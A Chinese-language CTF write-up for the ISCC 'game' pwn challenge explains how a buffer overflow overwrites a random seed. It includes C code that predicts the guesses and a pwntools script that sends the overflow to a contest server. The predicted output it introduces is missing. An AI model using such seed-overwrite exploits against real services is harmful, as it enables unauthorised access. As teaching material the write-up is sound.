---
title: ISCC_game
date: 2023-01-02 19:50:26
categories: 
- pwn_wp
tags: 
- pwn
- stackoverflow
- misc
---

随机数猜数字的程序，改种子后自己写程序预测出数字。

<!-- more -->

首先查壳，是64位的，没有栈保护，动态链接，NX可执行

这是个猜数字的程序。程序中用函数rand和srand生成随机数。第一次的种子seed=time(0)用srand(seed)生成第二次的种子v3，再用v3生成随机数v7

```c
int v7=rand()%0x64+1;
```
当我们连续9次猜对v7的时候，就会执行flag(),我们就成功了!
但只要有一次猜错，都会执行exit(0)

这题和之前写过的猜数字挺像的
我们发现程序中的read函数有点问题
```c
read (0,&buf,0x2cull)
```
将0x2c(44个字节)的内容读入buf
然而若读入44个字节正好能覆盖掉seed

而如果我们写入值覆盖seed，rand()函数生成的随机数就可以被我们预测出。

此处用aaaa覆盖掉seed的四个字节
aaaa变为整型是0x61616161
通过仿照原程序写代码可以得到每一次要输出的值
```c
#include<stdio.h>
#include<stdlib.h>
int main()
{
	int v3;
	int v7;
	srand(0x61616161);
	for(int i=0;i<=9;i++)
	{
	v3=rand();
	srand(v3);
	v7=rand()%100+1;
	printf("%d\n",v7);
	}
	return 0;
}
```
用gcc编译链接后得到可执行程序，运行后得到：

这些就是9次猜数字的答案

接下来是exp
```python
from pwn import*
r=remote('39.96.88.40',7040)
r.recv()
payload=(0x30-0x4)*'a'
r.sendline(payload)
r.interactive()
```
建立连接后依次输出得到的9个答案
就能得到shell

